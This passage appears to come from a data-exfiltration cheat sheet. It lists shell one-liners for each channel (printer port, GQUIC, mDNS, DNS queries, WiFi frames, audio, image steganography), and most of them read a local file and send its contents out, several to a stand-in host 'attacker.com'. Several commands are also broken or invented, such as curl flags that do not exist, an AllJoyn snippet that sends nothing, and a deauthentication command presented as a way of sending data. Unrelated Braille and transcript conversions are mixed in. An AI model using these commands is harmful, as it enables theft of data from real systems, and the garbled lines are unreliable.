`echo -n "$(cat /path/to/local/file.txt)" | telnet [printer_IP] 9100`

### GQUIC - Google Quick UDP 

1. **Using `curl` with `quiche` to send data over GQUIC:**


`curl --proto '=gquic' --quic-version=h3-23 --data-binary "@/path/to/local/file.txt" "https://attacker.com"`

2. **Using `quiche-client` to send data over GQUIC:**


`quiche-client -q "GET /" -f "/path/to/local/file.txt" https://attacker.com:4433`

3. **Using Python with `aioquic` to send data over GQUIC:**


`python -m aioquic.client https://attacker.com:4433 "/path/to/local/file.txt"`



### MDNS Query

1. **Using `avahi-resolve` on Linux to send data in mDNS queries:**


`echo -n "$(cat /path/to/local/file.txt)" | xargs -I {} avahi-resolve --name "{}.$(cat /path/to/local/file.txt)" -4`

2. **Using `dns-sd` on macOS to send data in mDNS queries:**


`echo -n "$(cat /path/to/local/file.txt)" | xargs -I {} dns-sd -q "{}.$(cat /path/to/local/file.txt)"`

3. **Using `mdns-scan` on Linux to send data in mDNS queries:**


`echo -n "$(cat /path/to/local/file.txt)" | xargs -I {} mdns-scan --query "{}.$(cat /path/to/local/file.txt)"`


### AllJoyn

1. **Using `aj_send` tool to send data over AllJoyn:**


`echo -n "$(cat /path/to/local/file.txt)" | aj_send $(cat /path/to/local/file.txt)`

2. **Using Python with the `alljoyn` library to send data over AllJoyn:**


`python -c "from alljoyn import AllJoyn, InterfaceDescription; aj = AllJoyn(); service = aj.create_service('org.example.ExfiltrationService'); service.add_signal('sendData', 's'); iface = InterfaceDescription(aj, 'org.example.ExfiltrationInterface'); iface.add_signal('sendData', 's'); aj.register_interface(iface); service.setup()"`

3. **Using `alljoyn-daemon` to send data over AllJoyn:**


`echo -n "$(cat /path/to/local/file.txt)" | alljoyn-daemon --session sender $(cat /path/to/local/file.txt)`


### DNSQ

1. **Using `dig` to send data in DNS queries:**


`dig @"DNS_server_IP" "$(cat /path/to/local/file.txt).example.com"`

2. **Using `nslookup` to send data in DNS queries:**


`nslookup -q=txt "$(cat /path/to/local/file.txt).example.com" "DNS_server_IP"`

3. **Using `host` to send data in DNS queries:**


`host -t txt "$(cat /path/to/local/file.txt).example.com" "DNS_server_IP"`

### Audio - No listener

1. **Using `sox` to encode data into audio tones:**


`sox -n -r 44100 -b 16 output.wav synth 10 sin $(echo "$(cat /path/to/local/file.txt)" | xxd -p | sed 's/../& /g')`

2. **Using `ffmpeg` to encode data into audio tones:**


`ffmpeg -f lavfi -i "sine=frequency=$(echo "$(cat /path/to/local/file.txt)" | xxd -p | sed 's/../& /g')" -t 10 output.wav`

3. **Using `play` from `sox` to play the encoded audio:**


`play output.wav`


### WiFi - On Payload 

1. **Using Scapy in Python to send data via WiFi frames:**


`python -c "from scapy.all import *; sendp(RadioTap()/Dot11(type=2, subtype=4, addr1='[destination_MAC]', addr2='[source_MAC]', addr3='[destination_MAC]')/Raw(load='$(cat /path/to/local/file.txt)'), iface='wlan0')"`

2. **Using Aircrack-ng suite to send data via WiFi frames:**


`echo -n "$(cat /path/to/local/file.txt)" | hexdump -v -e '"\x" 1/1 "%02x"' | xargs -I {} aireplay-ng -0 0 -e TestSSID -a [BSSID] -c [target_client_MAC] -y {}`

3. **Using Wireshark and Wi-Fi adapter in monitor mode to inject frames:**


`echo -n "$(cat /path/to/local/file.txt)" | xxd -p -c 10000 | xargs -I {} echo '{}' | text2pcap -t "%Y-%m-%d %H:%M:%S." -u 10000 -T 300 - MAC_HEADER_CAPTURE.pcap`

### 3.5mm Jack 

1. **Using `play` from `sox` to transmit audio through the 3.5mm jack:**


`echo -n "$(cat /path/to/local/file.txt)" | play -t raw -r 44100 -b 16 -c 2 -e signed -B -q -`

2. **Using a smartphone app to play audio tones from the file:**


`Install a tone generator app on your smartphone, load the file, and play it through the 3.5mm jack.`

3. **Using a microcontroller and a headphone jack to play audio signals:**


`Program a microcontroller to read the file and output the audio signal to a 3.5mm jack connected to headphones or speakers.`

### Binary Offset 

1. **Using `xxd` to encode data as binary and print specific offsets:**


`xxd -p /path/to/local/file.txt | cut -c 1-2,5-6,9-10 | xargs -I {} echo -n "0x{} "`

2. **Using Python to encode data as binary and generate specific offsets:**


`python -c "data = open('/path/to/local/file.txt', 'rb').read(); print(' '.join(['0x{:02x}'.format(b) for b in data[::4]]))"`

3. **Using Perl to encode data as binary and generate specific offsets:**


`perl -e 'open $f, "/path/to/local/file.txt"; while(read $f, $b, 1) { printf "0x%02x ", ord($b); }'`

### Video Transcript to Dictionary 

1. **Using Python to convert a video transcript into a dictionary:**


`python -c "import json; transcript = json.dumps({'transcript': open('/path/to/transcript.txt', 'r').read()}); print(transcript)"`

2. **Using `jq` to convert a video transcript into a JSON dictionary:**


`echo '{ "transcript": "'$(cat /path/to/transcript.txt)'" }' | jq .`

3. **Using Ruby to convert a video transcript into a dictionary:**


`ruby -rjson -e 'puts JSON.dump({"transcript" => File.read("/path/to/transcript.txt")})'`

### Braille Text Document 

1. **Using Python to convert a text file into a Braille document:**


`python -c "braille_dict = {'a': '⠁', 'b': '⠃', 'c': '⠉', 'd': '⠙', 'e': '⠑', 'f': '⠋', 'g': '⠛', 'h': '⠓', 'i': '⠊', 'j': '⠚'}; text = open('/path/to/local/file.txt', 'r').read().lower(); braille_text = ' '.join([braille_dict[c] for c in text if c in braille_dict]); print(braille_text)"`

2. **Using `sed` and Unicode Braille characters to convert a text file into Braille:**


`sed 's/\(.\)/\1 /g' /path/to/local/file.txt | sed 's/a/⠁/g; s/b/⠃/g; s/c/⠉/g; s/d/⠙/g; s/e/⠑/g; s/f/⠋/g; s/g/⠛/g; s/h/⠓/g; s/i/⠊/g; s/j/⠚/g'`

3. **Using `awk` and Braille Unicode characters to convert a text file into Braille:**


`awk '{gsub(/./,"& "); for (i=1; i<=NF; i++) { if ($i == "a") $i="⠁"; else if ($i == "b") $i="⠃"; else if ($i == "c") $i="⠉"; else if ($i == "d") $i="⠙"; else if ($i == "e") $i="⠑"; else if ($i == "f") $i="⠋"; else if ($i == "g") $i="⠛"; else if ($i == "h") $i="⠓"; else if ($i == "i") $i="⠊"; else if ($i == "j") $i="⠚"; } }1' OFS= /path/to/local/file.txt`

### PNG Transparency 

1. **Using `steghide` to embed data in the alpha channel of a PNG image:**


`steghide embed -cf input.png -ef /path/to/local/file.txt -sf output.png`

2. **Using `zsteg` to extract data from the alpha channel of a PNG image:**


`zsteg -E '/path/to/local/file.txt' -s 1 input.png`

3. **Using `stegosuite` to embed data in the alpha channel of a PNG image:**


`java -jar stegosuite.jar -e hide -carriers input.png -out output.png -secret /path/to/local/file.txt -algorithm ALPHABETA`




### DataMatrix over LSB

1. **Using `steghide` to embed data in the least significant bits of an image:**


`steghide embed -cf input.png -ef /path/to/local/file.txt -sf output.png`

2. **Using `zsteg` to extract data from the least significant bits of an image:**


`zsteg -E '/path/to/local/file.txt' input.png`

3. **Using Python with the `PIL` library to embed data in the least significant bits of an image:**


`python -c "from PIL import Image; im = Image.open('input.png'); data = open('/path/to/local/file.txt', 'rb').read(); im.putdata([(r&254, g, b) for (r, g, b) in im.getdata()]); im.save('output.png')"`


Cover By [Henrik Evensen](https://www.artstation.com/selvestehe)
